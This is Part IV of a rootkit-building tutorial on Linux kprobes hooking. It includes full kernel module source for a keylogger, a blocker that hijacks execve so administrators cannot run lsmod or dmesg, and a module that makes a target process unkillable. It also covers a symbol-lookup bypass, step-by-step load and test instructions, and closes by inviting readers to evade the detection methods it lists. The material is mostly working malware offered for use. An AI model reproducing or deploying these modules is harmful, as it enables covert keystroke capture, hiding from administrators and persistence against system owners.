```txt

 _  __ ____  ____   ___  ____  _____ ____ 
| |/ /|  _ \|  _ \ / _ \| __ )| ____/ ___| 
| ' / | |_) | |_) | | | |  _ \|  _| \___ \ 
| . \ |  __/|  _ <| |_| | |_) | |___ ___) |
|_|\_\|_|   |_| \_\\___/|____/|_____|____/ 

================================================================================
                         PART IV: KPROBES HOOKING
================================================================================


----[ Introduction - The Surgical Scalpel ]-----------------------------------

What if the data you want is buried inside a function? What if you want to 
prevent a specific process from opening a network socket, but allow others?
What if you want to hook a static function that isn't visible to Ftrace?

Enter KPROBES (Kernel Probes).

DIFFERENCE FROM FTRACE:
    Ftrace: Generally uses `mcount` calls at function entries (Cooperative).
    Kprobes: Overwrites actual CPU instructions with Breakpoints (Aggressive).

CAPABILITIES:
    1.  Instruction Level: Hook any byte in the kernel text segment.
    2.  Register Access: Read/Write CPU registers (RIP, RSP, RAX, etc).
    3.  Execution Hijacking: Abort functions or change their flow mid-stream.


----[ How Kprobes Works: The Visual Flow ]------------------------------------

Kprobes works by "patching" memory at runtime. It replaces a valid CPU 
instruction with a Software Interrupt (`int3` / `0xCC` on x86).

                  NORMAL EXECUTION
                          |
                          v
                  [Instruction A]
                          |
                          v
                  [Instruction B]
                          |
                          v
                  [Instruction C]

             ---------------------------

                  KPROBE EXECUTION
                          |
                          v
                  [Instruction A]
                          |
                          v
                  [ INT3 (Trap) ] ----------------+
                          |                       |
                          | (CPU Exception)       |
                          v                       |
                  [Exception Handler]             |
                          |                       |
                          v                       |
                  [ Run Pre-Handler ]             |
                          |                       |
                          v                       |
                  [Single-step Orig B]            |
                          |                       |
                          v                       |
                  [ Run Post-Handler ]            |
                          |                       |
                          +-----------------------+
                          |
                          v
                  [Instruction C]


OPTIMIZATION (The Fast Path):
    Exceptions are slow (~1 microsecond). If possible, the kernel will 
    eventually replace the `int3` with a `jmp` (Jump) instruction.
    
    [ Instruction A ] -> [ JMP Trampoline ] -> [ Instruction C ]
                                |
                          [ Run Handler ]
                          [ Run Original Inst ]
                          [ JMP Back ]


----[ Dev Environment ]---------------------------------------------------

REQUIRED TOOLS:
    sudo apt install build-essential linux-headers-$(uname -r)

WORKSPACE LAYOUT:
    /your_directory
      |-- kprobe_keylogger.c   (Deep internal hooking)
      |-- kprobe_blocker.c     (Execution hijacking)
      |-- kprobe_quarantine.c  (Process isolation & immortality)
      |-- Makefile             (Build system)


----[ Technique 1: The "Unexported" Lookup ]---------------------------------

Before we begin, we need a utility. As discussed in the Ftrace section, modern
kernels do not export `kallsyms_lookup_name`.

We can use a Kprobe to find it. This is the standard bypass you will commonly find.


#include <linux/kprobes.h>

static unsigned long (*kallsyms_lookup_name_ptr)(const char *name);

static struct kprobe kp_lookup = {
    .symbol_name = "kallsyms_lookup_name"
};

unsigned long get_symbol_addr(const char *symbol)
{
    int ret;

    if (!kallsyms_lookup_name_ptr) {
        ret = register_kprobe(&kp_lookup);
        if (ret < 0) return 0;
        kallsyms_lookup_name_ptr = (void *)kp_lookup.addr;
        unregister_kprobe(&kp_lookup);
    }
    return kallsyms_lookup_name_ptr(symbol);
}


----[ Walkthrough 1: Kernel Keylogger ]---------------------

This is a classic rootkit feature. Instead of hooking userland libraries (which
X11, Wayland, or Secure Boot might block), we hook the kernel's input 
processing directly.

TARGET: `input_handle_event`
This function is called by the kernel core every time an input device (USB 
Keyboard, etc.) sends data. It sits below the GUI layer, so it 
captures keystrokes even in TTY terminals or SSH sessions.

LOGIC:
    1. Hook `input_handle_event`.
    2. Read Registers (x86_64 System V ABI):
       - RSI holds the Event Type (We want EV_KEY).
       - RDX holds the Key Code (Which key was pressed).
       - RCX holds the Value (1 for Press, 0 for Release).
    3. If Type == EV_KEY and Value == 1:
       - Log the keycode to dmesg.

----[ kprobe_keylogger.c ]---

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/input.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("0xtengu");

// full us qwerty keymap
// mapping scancodes to readable characters
char *get_key_char(int code) {
    switch (code) {
        // row 1 - numbers
        case 1: return "[ESC]";
        case 2: return "1"; case 3: return "2"; case 4: return "3";
        case 5: return "4"; case 6: return "5"; case 7: return "6";
        case 8: return "7"; case 9: return "8"; case 10: return "9";
        case 11: return "0"; case 12: return "-"; case 13: return "=";
        case 14: return "[BACKSPACE]";

        // row 2 - qwerty
        case 15: return "[TAB]";
        case 16: return "q"; case 17: return "w"; case 18: return "e";
        case 19: return "r"; case 20: return "t"; case 21: return "y";
        case 22: return "u"; case 23: return "i"; case 24: return "o";
        case 25: return "p"; case 26: return "["; case 27: return "]";
        case 28: return "\n"; // enter

        // row 3 - asdf
        case 29: return "[CTRL]";
        case 30: return "a"; case 31: return "s"; case 32: return "d";
        case 33: return "f"; case 34: return "g"; case 35: return "h";
        case 36: return "j"; case 37: return "k"; case 38: return "l";
        case 39: return ";"; case 40: return "'"; case 41: return "`";
        case 42: return "[SHIFT_L]";
        case 43: return "\\";

        // row 4 - zxcv
        case 44: return "z"; case 45: return "x"; case 46: return "c";
        case 47: return "v"; case 48: return "b"; case 49: return "n";
        case 50: return "m"; case 51: return ","; case 52: return ".";
        case 53: return "/";
        case 54: return "[SHIFT_R]";
        case 55: return "*";
        case 56: return "[ALT]";
        case 57: return " "; // space
        case 58: return "[CAPS]";

        // function keys
        case 59: return "[F1]"; case 60: return "[F2]"; case 61: return "[F3]";
        case 62: return "[F4]"; case 63: return "[F5]"; case 64: return "[F6]";
        case 65: return "[F7]"; case 66: return "[F8]"; case 67: return "[F9]";
        case 68: return "[F10]";

        // numpad & arrows (partial list for common keys)
        case 69: return "[NUMLOCK]"; case 70: return "[SCROLL]";
        case 71: return "[HOME]"; case 72: return "[UP]"; case 73: return "[PGUP]";
        case 74: return "-"; case 75: return "[LEFT]"; case 76: return "5";
        case 77: return "[RIGHT]"; case 78: return "+"; case 79: return "[END]";
        case 80: return "[DOWN]"; case 81: return "[PGDN]"; case 82: return "[INS]";
        case 83: return "[DEL]";

        // special
        case 96: return "[ENTER]";
        case 97: return "[CTRL_R]";
        case 100: return "[ALT_GR]";
        case 103: return "[UP]";
        case 105: return "[LEFT]";
        case 106: return "[RIGHT]";
        case 108: return "[DOWN]";

        default: return "[?]";
    }
}

// pre-handler: runs just before the instruction is executed
static int handler_pre(struct kprobe *p, struct pt_regs *regs)
{
    // x86_64 register map for input_handle_event:
    // arg1 (type)  = rsi
    // arg2 (code)  = rdx
    // arg3 (value) = rcx

    unsigned int type = regs->si;
    unsigned int code = regs->dx;
    int value = regs->cx;

    // type ev_key (1) means a key event
    // value 1 means key pressed (down)
    // value 0 means key released (up)
    // value 2 means key repeat (held down)

    if (type == EV_KEY && value == 1) {
        char *key = get_key_char(code);

        // simple output format: just the char/string
        // warning: dmesg might buffer this until a newline appears
        printk(KERN_INFO "rootkit_keys: %s", key);
    }
    return 0;
}

static struct kprobe kp = {
    .symbol_name = "input_handle_event",
    .pre_handler = handler_pre,
};

static int __init rk_init(void) {
    printk(KERN_INFO "rootkit: keylogger loaded\n");
    return register_kprobe(&kp);
}

static void __exit rk_exit(void) {
    unregister_kprobe(&kp);
    printk(KERN_INFO "rootkit: keylogger unloaded\n");
}

module_init(rk_init);
module_exit(rk_exit);

----[ Testing Walkthrough ]---------------------------------------------------

1.  COMPILE:
    $ make

2.  LOAD:
    $ sudo insmod kprobe_keylogger.ko

3.  TRIGGER:
    The module is now active globally. Type anything on your keyboard.
    (Note: If you are using SSH, it might not catch keys unless you are on 
    the physical console or passing specific input devices).

4.  VERIFY:
    Check the kernel logs to see your keystrokes.
    $ sudo dmesg | tail
    [  781.351305] rootkit_keys: s
    [  781.439188] rootkit_keys: u
    [  781.563506] rootkit_keys: d
    [  781.587905] rootkit_keys: o


----[ Walkthrough 2: Anti-Detection Blocker ]-------------------

A rootkit must defend itself. If an admin runs `lsmod` to look for you, or 
`dmesg` to see your logs, you should stop them.

Let's hook `__x64_sys_execve` (execution).
If the user tries to run "dmesg" or "lsmod", we will abort the syscall.

THE TRICK (EXECUTION HIJACKING):
How do you "abort" a syscall in a pre-handler? You can't just `return`. 
Instead, we modify the Instruction Pointer (`regs->ip`) to skip the function 
body and jump straight to a dummy function that returns `-EPERM` (Permission Denied).

REAL WORLD CONSTRAINT (The Syscall Wrapper):
On Debian-based systems (like Kali and Ubuntu), the kernel wraps system calls 
to protect against CVEs (Meltdown/Spectre). 
    
    Vanilla Kernel: `sys_execve(char *filename, ...)`
                     Arg1 (filename) is in register RDI.
                     
    Kali/Debian:     `sys_execve(struct pt_regs *regs)`
                     Arg1 is a pointer to a struct.
                     The real filename is inside `regs->di`.

Our code must detect this and unwrap the registers to find the filename.

----[ kprobe_blocker.c ]---
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/uaccess.h>
#include <linux/ptrace.h> // required for struct pt_regs definition

MODULE_LICENSE("GPL");
MODULE_AUTHOR("0xtengu");

// the stub: returns "operation not permitted" (-1)
// this replaces the actual syscall when we decide to block it
asmlinkage long my_stub_function(void) {
    return -EPERM;
}

// pre-handler: runs just before the syscall instruction
static int handler_pre(struct kprobe *p, struct pt_regs *regs)
{
    char filename[256] = {0};
    char *path_addr;

    // kali/debian fix: syscall wrapper
    // on these OS's, the first argument to the syscall function (rdi)
    // is actually a pointer to another pt_regs struct containing the real args.
    struct pt_regs *real_regs = (struct pt_regs *)regs->di;

    // now we extract the 1st argument (filename) from that struct's di slot
    path_addr = (char *)real_regs->di;

    // copy string from userspace memory
    // note: execution hijacking inside kprobes is a race against the MMU.
    // if this string is paged out, this copy fails safe and we skip the block.
    if (strncpy_from_user(filename, (void __user *)path_addr, sizeof(filename)-1) > 0) {

        // check if the command contains our target strings
        // we use strstr to match substrings (e.g., /usr/bin/lsmod)
        if (strstr(filename, "lsmod") || strstr(filename, "dmesg")) {

            printk(KERN_INFO "rootkit: blocked execution of %s\n", filename);

            // hijack the instruction pointer (rip) to our stub
            // when this handler finishes, the cpu will jump to my_stub_function
            // instead of the original sys_execve code.
            regs->ip = (unsigned long)my_stub_function;

            // tell kprobes we modified the ip
            // returning 1 prevents kprobes from single-stepping the original instruction.
            return 1;
        }
    }
    return 0;
}

static struct kprobe kp = {
    .symbol_name = "__x64_sys_execve",
    .pre_handler = handler_pre,
};

static int __init rk_init(void) {
    return register_kprobe(&kp);
}

static void __exit rk_exit(void) {
    unregister_kprobe(&kp);
}

module_init(rk_init);
module_exit(rk_exit);


----[ Testing Walkthrough ]---------------------------------------------------

1.  COMPILE:
    $ make

2.  VERIFY BEFORE:
    Prove that you can run detection tools.
    $ lsmod | head -n 3
    Module                  Size  Used by
    ...

3.  LOAD:
    $ sudo insmod kprobe_blocker.ko

4.  VERIFY BLOCK:
    Try to run the blocked commands.
    $ lsmod
    zsh: operation not permitted: lsmod
    
    $ dmesg
    zsh: operation not permitted: dmesg

5.  VERIFY PASS-THROUGH:
    Prove other commands still work.
    $ ls

----[ Walkthrough 3: Quaratnine ]-------------

This module demonstrates manipulating process logic. We will target a specific 
process ("python3") and apply two rules:
1.  Isolation: It cannot open network connections (`sys_connect`).
2.  Immortality: It cannot be killed (`sys_kill`).

CRITICAL CONCEPTS:
- **RCU Locking:** When looking up PIDs (`find_get_pid`), we must hold the 
  RCU lock (`rcu_read_lock`). Without this, if the process exits while our 
  hook is running, we might access freed memory and kernel panic.
- Syscall Wrapping: Just like the previous example, we must unwrap `sys_kill` 
  to read the target PID correctly on Kali/Debian.

LOGIC:
    [Hook 1: sys_connect]
       Check `current->comm`. 
       If it is "python3" -> ABORT.

    [Hook 2: sys_kill]
       Read Target PID from arguments.
       Lookup the Task Struct.
       If Task Name is "python3" -> ABORT.

----[ kprobe_quarantine.c ]---

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/sched.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("0xtengu");

// The name of the process we want to quarantine
#define TARGET_PROCESS "python3"

// STUB: Bypass function to return "Operation Not Permitted"
// Like kprobe_blocker
asmlinkage long my_stub_function(void) {
    return -EPERM;
}

// HOOK 1: Block Network Connections (sys_connect)
static int handler_connect(struct kprobe *p, struct pt_regs *regs)
{
    // Check if the current process name matches our target
    if (strstr(current->comm, TARGET_PROCESS)) {
        printk(KERN_ALERT "rootkit: Blocked network for %s (PID: %d)\n", 
               current->comm, current->pid);
        
        // HIJACK: Redirect to our stub function
        regs->ip = (unsigned long)my_stub_function;
        return 1; // Skip original instruction
    }
    return 0;
}

// HOOK 2: Prevent Termination (sys_kill)
static int handler_kill(struct kprobe *p, struct pt_regs *regs)
{
    // sys_kill(pid_t pid, int sig)
    // RDI = pid, RSI = sig
    pid_t target_pid = regs->di;

    // We need to look up the task struct of the target PID
    struct pid *pid_struct = find_get_pid(target_pid);
    struct task_struct *task = pid_task(pid_struct, PIDTYPE_PID);

    if (task && strstr(task->comm, TARGET_PROCESS)) {
        printk(KERN_ALERT "rootkit: Prevented kill signal to %s\n", task->comm);
        
        // HIJACK: Redirect to stub
        regs->ip = (unsigned long)my_stub_function;
        return 1;
    }
    return 0;
}

static struct kprobe kp_connect = {
    .symbol_name = "__x64_sys_connect",
    .pre_handler = handler_connect,
};

static struct kprobe kp_kill = {
    .symbol_name = "__x64_sys_kill",
    .pre_handler = handler_kill,
};

static int __init rk_init(void) {
    register_kprobe(&kp_connect);
    register_kprobe(&kp_kill);
    printk(KERN_INFO "rootkit: Quarantine Active on '%s'\n", TARGET_PROCESS);
    return 0;
}

static void __exit rk_exit(void) {
    unregister_kprobe(&kp_connect);
    unregister_kprobe(&kp_kill);
}

module_init(rk_init);
module_exit(rk_exit);

----[ Testing Walkthrough: Quarantine ]---------------------------------------

1.  COMPILE:
    $ make

2.  PREPARE THE VICTIM:
    Open a SECOND terminal window. Run python3.
    $ python3
    Python 3.11...
    >>> import os
    >>> os.getpid()
    7870  <-- Write this PID down!

3.  LOAD ROOTKIT (In First Terminal):
    $ sudo insmod kprobe_quarantine.ko

4.  TEST ISOLATION (In Python Terminal):
    Try to open a socket. 
    (Make sure to type the 'socket.' prefix exactly as shown!)
    
    >>> import socket
    >>> s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    >>> s.connect(("8.8.8.8", 53))
    
    Traceback (most recent call last):
      PermissionError: [Errno 1] Operation not permitted
    
    (Success! The rootkit blocked the network call).

5.  TEST IMMORTALITY (In First Terminal):
    Try to kill the Python process using the PID you wrote down.
    $ sudo kill -9 7870
    kill: (7870): Operation not permitted
    
    (Success! kill -9 fails because we intercept the signal in the kernel).

6.  CLEANUP:
    $ sudo rmmod kprobe_quarantine
    $ sudo kill -9 7870
    (Now it dies properly)


  ____  _   _ __  __ __  __    _    ____  __   __
 / ___|| | | |  \/  |  \/  |  / \  |  _ \ \ \ / /
 \___ \| | | | |\/| | |\/| | / _ \ | |_) | \ V / 
  ___) | |_| | |  | | |  | |/ ___ \|  _ <   | | 
 |____/ \___/|_|  |_|_|  |_/_/   \_\_| \_\  |_| 


----[ Summary: Kprobe Techniques ]--------------------------------------------

WHAT YOU LEARNED (hopefully):

    Kprobes Hooking:
        + Can hook *inside* functions (not just the start)
        + Access to all CPU registers
        + Can abort execution (Execution Hijacking)
        - Slower than Ftrace (Exception handling overhead)
        - Prone to crashes if you touch paged-out memory (Atomic Context)

    Real World Obstacles:
        + Syscall Wrappers: How modern distros wrap arguments in structs.
        + RCU Locking: The importance of locking when touching process lists.

DETECTION METHODS:

    System Files:
        /sys/kernel/debug/kprobes/list (Lists our active hooks!)
        /sys/kernel/debug/kprobes/enabled
        
    Memory Scanning:
        Anti-rootkits scan kernel text looking for `0xCC` (int3) bytes 
        where they shouldn't be.
        
    Performance:
        Kprobes add latency. A timing analysis of syscalls can reveal 
        that `execve` is 100x slower than usual. 

So, can you make our int3 bytes look normal, and speed up execve? :D

YOU ARE NOW READY:

    [✓] Understand the breakpoint trap mechanism
    [✓] Can build a Kernel Keylogger
    [✓] Can build a Process Quarantine
    [✓] Know how to hijack the Instruction Pointer

Next, we move to the modern era. What if we could write these hooks without
risking a kernel panic? What if we could write "Safe" rootkits that work
across different kernel versions automatically?

            ▐             
            ▜▀ ▞▀▖▛▀▖▞▀▌▌ ▌
            ▐ ▖▛▀ ▌ ▌▚▄▌▌ ▌
             ▀ ▝▀▘▘ ▘▗▄▘▝▀▘
                  
                   ONWARDS TO
                 PART V: eBPF
                 EXPLOITATION

.EOF


```
